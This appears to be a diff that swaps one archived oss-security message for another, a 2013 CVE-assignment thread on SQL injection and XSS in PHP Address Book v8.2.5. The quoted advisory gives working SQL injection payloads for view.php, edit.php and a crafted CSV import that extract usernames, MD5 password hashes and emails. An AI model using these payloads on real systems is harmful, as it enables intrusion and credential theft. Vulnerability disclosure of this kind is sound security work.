@@ -1,20 +1,142 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/02/24/5
-Message-ID: <1629487.68S4Xka9K7@devil>
-Date: Sun, 24 Feb 2013 20:00:57 +0100
-From: Agostino Sarubbo <ago@...too.org>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/05/11/1
+Message-ID: <518DA98A.1050007@redhat.com>
+Date: Fri, 10 May 2013 20:14:34 -0600
+From: Kurt Seifried <kseifried@...hat.com>
 To: oss-security@...ts.openwall.com
-Subject: CVE request: monkeyd world-readable logdir
+CC: Doraemon Sk8ers <doraemon.sk8ers@...il.com>, Henri Salo <henri@...v.fi>
+Subject: Re: Multiple vulnerabilities in PHP Address Book v8.2.5
 Content-Type: text/plain; charset=utf-8
 
-Monkeyd, a small, fast, and scalable web server, produces, at least on gentoo 
-a world-readable log.
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
 
-# ls /var/log/monkeyd/master.log -la
--rw-r--r-- 1 root root 0 Feb 24 19:56 /var/log/monkeyd/master.log
+On 05/10/2013 03:14 AM, Doraemon Sk8ers wrote:
+> Hi Henri,
+> 
+> CVE-2013-1748 #1 does seems to be similar with CVE-2008-2565, the
+> only difference is the increase in the number of columns To our
+> knowledge, CVE-2013-1748 #2 and #3 has not been published before
 
-Upstream site: http://www.monkey-project.com/
+So can we confirm that CVE-2013-1748 #1 is duplicate of CVE-2008-2565
+and that #2 and #3 are new? if so can we just use CVE-2013-1748 for #2
+and #3 Steve?
 
--- 
-Agostino Sarubbo
-Gentoo Linux Developer
+> Regards Team Doraemon.Sk8ers http://doraemondroids.wikispaces.com/
+> 
+> On Wed, Apr 17, 2013 at 10:27 PM, Henri Salo <henri@...v.fi>
+> wrote:
+> 
+>> Hello,
+>> 
+>> I believe CVE-2013-1748 #1 is duplicate of CVE-2008-2565 as per
+>> OSVDB[1]. As far as I know most of security vulnerabilities
+>> reported to this project haven't been fixed. Haven't verified
+>> this detail. What php-addressbook project would need is patches
+>> to fix all issues you can find. Finding vulnerabilities is easy
+>> - fixing in upstream is not. I can help you if you are willing to
+>> write patches. Takes hour or two :)
+>> 
+>> 1: http://osvdb.org/45965
+>> 
+>> --- Henri Salo
+>> 
+>> On Wed, Apr 17, 2013 at 11:14:27AM +0800, Doraemon Sk8ers wrote:
+>>> There is a SQL injection vulnerability and reflected XSS in
+>>> Simple PHP Address Book v8.2.5. The 2 vulnerabilities had been
+>>> assigned the CVE identifier CVE-2013-1748 (SQLi) &
+>>> CVE-2013-1749 (XSS) respectively.
+>>> 
+>>> # Software Link:
+>>> http://sourceforge.net/projects/php-addressbook/ # Version:
+>>> v8.2.5 # Tested on: v8.2.5 # CVE : CVE-2013-1748 (SQLi) &
+>>> CVE-2013-1749 (XSS)
+>>> 
+>>> 
+>>> Details: ----------- * * *CVE-2013-1748 (SQLi)*
+>>> 
+>>> We have discovered 3 pages which are prone to SQL Injection
+>>> 
+>>> 1.    /view.php?id=1 The "id" parameter is vulnerable to SQL
+>>> injection Injection Vector: /view.php?id=-1' union select
+>>> '1','2','3','4',(select username from users limit 1),(select
+>>> md5_pass from users limit 1),(select email from users limit
+>> 1),'8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41
+>>>
+>> 
+This injection vector will dump the username, md5 password and email
+>>> of the first user in the user table onto the page itself
+>>> 
+>>> 2.    /edit.php Most of the fields on this page are vulnerable
+>>> to SQL injection Injection Vector (inclusive of quotes): 
+>>> '+(select ASCII(SUBSTRING((SELECT md5_pass from users limit
+>>> 1),
+>> 1)))+'
+>>> This will dump out the ASCII value of the 1st character of the
+>>> md5 password of the first user
+>>> 
+>>> 3.    /import.php The same injection vulnerability as Point 2
+>>> above is also present in the import function Using the same
+>>> injection vector, saved in a csv file '+(select
+>>> ASCII(SUBSTRING((SELECT md5_pass from users limit 1),
+>> 1)))+'
+>>> Similarly, this injection vector will dump out the ASCII value
+>>> of the 1st character of the md5 password of the first user
+>>> 
+>>> The original input csv sample looks like this "Last
+>>> name";"First 
+>>> name";"Birthday";"Address";"ZIP";"City";"Home";"Mobile";"E-mail
+>>>
+>>> 
+home";"Work";"Fax";"E-mail office";"Second address";"Second phone"
+>>> "thelastname";"thefirstname";"13.09.1951";"Street";"1234";"city,
+>>>
+>>> 
+Country";"+1 123 456 789";"+2 345 678 910";"first.last@...l1.com";"+3
+>>> 456 789 101";"+4 567 897 011";"first.last@...l2.net";"second
+>>> street, 1234 secondcity, secondcountry";"+5 678 910 111"
+>>> 
+>>> The injected csv with the injected vectors looks like this 
+>>> "Last name";"First 
+>>> name";"Birthday";"Address";"ZIP";"City";"Home";"Mobile";"E-mail
+>>>
+>>> 
+home";"Work";"Fax";"E-mail office";"Second address";"Second phone"
+>>> "";"injectedthrucsv";"13.09.1951";"'+(select
+>>> ASCII(SUBSTRING((SELECT md5_pass from users limit 1),
+>>> 1)))+'";"";"city, Country";"+1 123 456 789";"+2 345 678
+>>> 910";"first.last@...l1.com";"+3 456 789 101";"+4 567 897
+>>> 011";"first.last@...l2.net";"second street, 1234 secondcity, 
+>>> secondcountry";"+5 678 910 111"
+>> <snip>
+>> 
+>> -----BEGIN PGP SIGNATURE----- Version: GnuPG v1.4.10 (GNU/Linux)
+>> 
+>> iEYEARECAAYFAlFusWEACgkQXf6hBi6kbk+zewCgv1NZPnNJ+oullyyNGCZIiZDE 
+>> yVgAn0B3sIciT45IzHOQgAhZpEl+ul0p =c0zL -----END PGP
+>> SIGNATURE-----
+>> 
+>> 
+> 
+
+
+- -- 
+Kurt Seifried Red Hat Security Response Team (SRT)
+PGP: 0x5E267993 A90B F995 7350 148F 66BF 7554 160D 4553 5E26 7993
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.13 (GNU/Linux)
+
+iQIcBAEBAgAGBQJRjamKAAoJEBYNRVNeJnmT+JkP/i0wU2O3TQWOmwPjUMUdFaq0
+Y7R1NjaNXkoFW5Djj4oPxyVaQCl6DqrsYg6/Un7/0DhBGQ9GBw3i9/AYXHkQCj/k
+lfC78SGQUpoO5Lniuy1uyuvf92GlL+0oIX8S/I1RVCmDNyfi9LCQCy7rsKdVG6Re
+L9/db4vbsM/ppVcdOHwAXyR7zZoOJZbC1zOlHECJnc7gHBpbKJYGofGue/9LaTUD
+5oySftGo6gsA1MWxcW/NaBStBt9XDuGSSo8YQO2cMi8CF5YhGY03y9l+EbhaOm8n
+MQe+fIEKk+r5H6gf7mw7SLcUU0zYgJhNmIo1b9hZyT+SWOzQk+GV12en0OwNpyKL
+hm37RlM7HJwR+ocR5F/Dr31d0S8udZMawdXLbT7qU3J/O0OWnQgQeTrwE9zd+toV
+cwRElqVTFpTiqGHCfv8vq2LC1oXgSHfcGyoT5dp1u19lH0foLA+xGSse6yJrlu2d
+PudNnaLs/IU4vEjOfjT9qURyw6z6rl5kM1Y5TsAxjGZ33BCxqNmo0cZpAY+shfId
+xv3K+U47xPzet2I4cmUYc8NryEpYa7MFGGUpHfoJdx+8rpnYuJoMjVSdD+d7bdPN
+X4nacE6Q7Pg2NlWIkYzIA4SnOTnQlBqX5VlZbxi15wrgHwgJvb+cRjAATG9Q1Q+x
+txg9coELprnCwdr/5zZJ
+=a2cz
+-----END PGP SIGNATURE-----
